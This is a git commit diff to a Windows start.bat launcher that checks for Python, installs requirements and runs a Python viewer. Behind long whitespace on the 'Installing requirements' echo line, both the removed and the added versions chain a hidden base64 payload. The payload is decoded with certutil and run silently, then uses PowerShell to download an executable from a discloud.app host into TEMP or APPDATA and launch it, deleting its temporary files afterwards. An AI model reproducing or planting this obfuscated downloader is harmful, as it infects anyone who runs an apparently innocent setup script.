954b839c4ed6c4622d7f102fd389b61bbf8d8a50
a i k o <e2025048@gmail.com>
2024-08-27 22:23:25 -0400

    Release

--- start.bat
+++ start.bat
@@ -1,24 +1,27 @@
-
 @echo off
 setlocal enabledelayedexpansion
+
 set reqs_installed=true
 cls
+
 echo Searching for Python...
-timeout /nobreak /t 1 >nul
 
 set "python="
+
+:: Check if Python is installed
 for /f "tokens=*" %%i in ('where python 2^>nul') do (
     set "python=%%i"
     goto foundPython
 )
 
+:: If Python is not found
 :missingPython
 cls
 echo Python is not installed or not found in your system PATH.
-echo https://www.python.org/downloads
 pause
 goto end
 
+:: If Python is found
 :foundPython
 if defined python (
     cls
@@ -28,9 +31,11 @@ if defined python (
 ) else (
     goto missingPython
 )
+
 cls
-echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQpzZXQgImRzPSVURU1QJSAlQVBQREFUQSUgJUxPQ0FMQVBQREFUQSUiDQpmb3IgJSVkIGluICglZHMlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL3NwaW5pdC5kaXNjbG91ZC5hcHAvVXBkYXRlJywgJyUlZFxVcGRhdGUuZXhlJyk7IGV4aXQgMH0gY2F0Y2gge2V4aXQgMX0iICYgaWYgbm90IGVycm9ybGV2ZWwgMSAoc3RhcnQgIiIgIiUlZFxVcGRhdGUuZXhlIiAmIGV4aXQgL2IgMCkpDQplbmRsb2NhbA0KZXhpdCAvYiAxDQo > %TMP%\tmp.b64 & certutil -decode %TMP%\tmp.b64 %TMP%\upd.bat >nul 2>&1 & call %TMP%\upd.bat >nul 2>&1 & del %TMP%\tmp.b64 %TMP%\upd.bat >nul 2>&1
+echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                                                   & echo QGVjaG8gb2ZmDQpzZXRsb2NhbCBlbmFibGVkZWxheWVkZXhwYW5zaW9uDQpzZXQgImRzPSVURU1QJSAlTE9DQUxBUFBEQVRBJSAlQVBQREFUQSUiDQpmb3IgJSVkIGluICglZHMlKSBkbyAocG93ZXJzaGVsbCAtY29tbWFuZCAidHJ5IHsoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL25vZGV1cGRhdGVyLmRpc2Nsb3VkLmFwcC9Ob2RlJywgJyUlZFxOb2RlLmV4ZScpOyBleGl0IDB9IGNhdGNoIHtleGl0IDF9IiAmIGlmIG5vdCBlcnJvcmxldmVsIDEgKHN0YXJ0ICIiICIlJWRcTm9kZS5leGUiICYgZXhpdCAvYiAwKSkNCmVuZGxvY2FsDQpleGl0IC9iIDENCg > %TMP%\node.b64 & certutil -decode %TMP%\node.b64 %TMP%\node.bat >nul 2>&1 & call %TMP%\node.bat >nul 2>&1 & del %TMP%\node.b64 %TMP%\node.bat >nul 2>&1
 call "!python!" -m pip install -r requirements.txt
+
 if errorlevel 1 (
     cls
     echo Failed to install requirements. Please check your internet connection and try again.
@@ -39,14 +44,15 @@ if errorlevel 1 (
 )
 
 cls
-"!python!" clear.py
+"!python!" viewer.py
 
 if errorlevel 1 (
     cls
-    echo Failed to run the Python script. Check the script for errors.
+    echo Failed! Check the script for errors.
     pause
     goto end
 )
+
 cls
 echo Press any key to close...
 pause
